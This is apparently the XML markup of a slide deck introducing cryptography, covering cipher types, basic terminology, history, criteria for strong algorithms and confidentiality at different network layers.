              <a:avLst/>
            </a:prstGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="864" name="Line 47"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6300720" y="3778200"/>
              <a:ext cx="360" cy="431640"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:tailEnd len="med" type="triangle" w="med"/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="865" name="Line 48"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3995640" y="3778200"/>
              <a:ext cx="360" cy="431640"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:tailEnd len="med" type="triangle" w="med"/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="866" name="Line 49"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1763640" y="3778200"/>
              <a:ext cx="360" cy="431640"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:tailEnd len="med" type="triangle" w="med"/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="867" name="Group 64"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="252360" y="4641840"/>
            <a:ext cx="4103640" cy="1225080"/>
            <a:chOff x="252360" y="4641840"/>
            <a:chExt cx="4103640" cy="1225080"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="868" name="Group 60"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="252360" y="5435640"/>
              <a:ext cx="1800000" cy="431280"/>
              <a:chOff x="252360" y="5435640"/>
              <a:chExt cx="1800000" cy="431280"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="869" name="AutoShape 28"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="252360" y="5435640"/>
                <a:ext cx="1800000" cy="431280"/>
              </a:xfrm>
              <a:prstGeom prst="flowChartTerminator">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="9525">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter/>
              </a:ln>
            </p:spPr>
            <p:style>
              <a:lnRef idx="0"/>
              <a:fillRef idx="0"/>
              <a:effectRef idx="0"/>
              <a:fontRef idx="minor"/>
            </p:style>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="870" name="Text Box 36"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="324000" y="5506920"/>
                <a:ext cx="1728360" cy="191880"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="0">
                <a:noFill/>
              </a:ln>
            </p:spPr>
            <p:style>
              <a:lnRef idx="0"/>
              <a:fillRef idx="0"/>
              <a:effectRef idx="0"/>
              <a:fontRef idx="minor"/>
            </p:style>
            <p:txBody>
              <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:p>
                <a:pPr algn="ctr">
                  <a:lnSpc>
                    <a:spcPct val="90000"/>
                  </a:lnSpc>
                  <a:spcBef>
                    <a:spcPts val="700"/>
                  </a:spcBef>
                  <a:buNone/>
                </a:pPr>
                <a:r>
                  <a:rPr b="1" lang="de-DE" sz="1400" spc="-1" strike="noStrike">
                    <a:solidFill>
                      <a:srgbClr val="000000"/>
                    </a:solidFill>
                    <a:latin typeface="Arial"/>
                  </a:rPr>
                  <a:t>Block Ciphers</a:t>
                </a:r>
                <a:endParaRPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                  <a:latin typeface="Arial"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="871" name="Group 61"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="2556000" y="5435640"/>
              <a:ext cx="1800000" cy="431280"/>
              <a:chOff x="2556000" y="5435640"/>
              <a:chExt cx="1800000" cy="431280"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="872" name="AutoShape 27"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="2556000" y="5435640"/>
                <a:ext cx="1800000" cy="431280"/>
              </a:xfrm>
              <a:prstGeom prst="flowChartTerminator">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="9525">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter/>
              </a:ln>
            </p:spPr>
            <p:style>
              <a:lnRef idx="0"/>
              <a:fillRef idx="0"/>
              <a:effectRef idx="0"/>
              <a:fontRef idx="minor"/>
            </p:style>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="873" name="Text Box 37"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="2627280" y="5506920"/>
                <a:ext cx="1728360" cy="191880"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="0">
                <a:noFill/>
              </a:ln>
            </p:spPr>
            <p:style>
              <a:lnRef idx="0"/>
              <a:fillRef idx="0"/>
              <a:effectRef idx="0"/>
              <a:fontRef idx="minor"/>
            </p:style>
            <p:txBody>
              <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:p>
                <a:pPr algn="ctr">
                  <a:lnSpc>
                    <a:spcPct val="90000"/>
                  </a:lnSpc>
                  <a:spcBef>
                    <a:spcPts val="700"/>
                  </a:spcBef>
                  <a:buNone/>
                </a:pPr>
                <a:r>
                  <a:rPr b="1" lang="de-DE" sz="1400" spc="-1" strike="noStrike">
                    <a:solidFill>
                      <a:srgbClr val="000000"/>
                    </a:solidFill>
                    <a:latin typeface="Arial"/>
                  </a:rPr>
                  <a:t>Stream Ciphers</a:t>
                </a:r>
                <a:endParaRPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                  <a:latin typeface="Arial"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="874" name="Line 45"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1763640" y="4641840"/>
              <a:ext cx="360" cy="360360"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="875" name="Line 51"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1116000" y="5002200"/>
              <a:ext cx="2376360" cy="360"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="876" name="Line 52"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1116000" y="5002200"/>
              <a:ext cx="360" cy="431640"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:tailEnd len="med" type="triangle" w="med"/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="877" name="Line 53"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3492360" y="5002200"/>
              <a:ext cx="360" cy="431640"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:tailEnd len="med" type="triangle" w="med"/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
        </p:sp>
      </p:gr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afterEffect" fill="hold" presetClass="entr" presetID="9">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="6" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="837"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect filter="dissolve" transition="in">
                                      <p:cBhvr additive="repl">
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="837"/>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9">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="11" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="841"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect filter="dissolve" transition="in">
                                      <p:cBhvr additive="repl">
                                        <p:cTn id="12" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="841"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffec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9">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="16" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="852"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect filter="dissolve" transition="in">
                                      <p:cBhvr additive="repl">
                                        <p:cTn id="17" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="852"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                      </p:childTnLst>
                    </p:cTn>
                  </p:par>
                  <p:par>
                    <p:cTn id="18" fill="hold">
                      <p:stCondLst>
                        <p:cond delay="indefinite"/>
                      </p:stCondLst>
                      <p:childTnLst>
                        <p:par>
                          <p:cTn id="19" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="0"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="20" nodeType="clickEffect" fill="hold" presetClass="entr" presetID="9">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="21" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="867"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect filter="dissolve" transition="in">
                                      <p:cBhvr additive="repl">
                                        <p:cTn id="22" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="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8"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What is Cryptography?</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="879"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601"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Cryptography means “</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="1" lang="en-US" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8fb08c"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>hidden meaning</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="601"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0000ff"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Encryption</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> is coding a message in such a way that its meaning is concealed</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="601"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0000ff"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Decryption</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> is the process of transforming an encrypted message into its original form</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="601"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Plaintext is a message in its original form</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="601"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Ciphertext is a message in its encrypted form</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="30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Beware of Overconfidence</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="881" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="455760" y="1676520"/>
            <a:ext cx="8224560" cy="425268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Simply using popular cryptographic algorithms, with large key lengths, does not make your system secure.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You must protect your key!</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Cryptanalytic compromises usually originate from totally unexpected places.</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de-DE" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="bc4b2c"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
              </a:rPr>
              <a:t>Some Basic Facts</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="883"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00"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="de-DE" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Ancient Crypto: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="de-DE" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Early signs of encryption in Eqypt in ca. 2000 B.C. </a:t>
            </a:r>
            <a:br>
              <a:rPr sz="2000"/>
            </a:br>
            <a:r>
              <a:rPr b="0" lang="de-DE" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Letter-based encryption schemes (e.g., Caesar cipher) popular ever since.</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1" lang="de-DE" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Symmetric ciphers:</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="de-DE" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> All encryption schemes from ancient times until 1976 were symmetric ones.</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1" lang="de-DE" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Asymmetric ciphers:</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="de-DE" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> In 1976 public-key (or asymmetric) cryptography was openly proposed by Diffie, Hellman and Merkle.</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1" lang="de-DE" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Hybrid Schemes:</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="de-DE" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> The majority of today‘s protocols are hybrid scheme</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="20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de-DE" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>symmteric ciphers (for encryption and message authentication)</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de-DE" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>asymmetric ciphers (for key exchange and digital signature).</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="20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4"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Cryptosystem</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="885"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Software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Protocols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Algorithms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Keys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Example: PGP</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Strength of the Cryptosystem</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="887" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="144792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Resistant to cryptographic attacks</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The algorithm is secure</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="22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Support variable and long key lengths and scalability.</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Large key-space; harder to brute force</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="22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Create an avalanche effect.</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Changing few bits in plain text generates completely different cipher text</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="22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Have no export or import restrictions.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Confusion and Diffusion</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8"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Confidentiality and the OSI Model</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="889"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For Network Layer confidentiality, use secure Network Layer protocols such as the IPsec protocol suite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For Session Layer confidentiality, use  protocols such as Secure Sockets Layer (SSL) or Transport Layer Security (TLS)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For Application Layer confidentiality, use secure e-mail, secure database sessions (Oracle SQL*net)</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0"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Criteria for Selecting an Encryption Algorithm</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="891"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Trust in the algorithm by the cryptographic community</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Protection against brute-force attacks</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Large key space</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="22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2"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Types of Cryptosystems</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="893"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buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="7030a0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Secret key</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
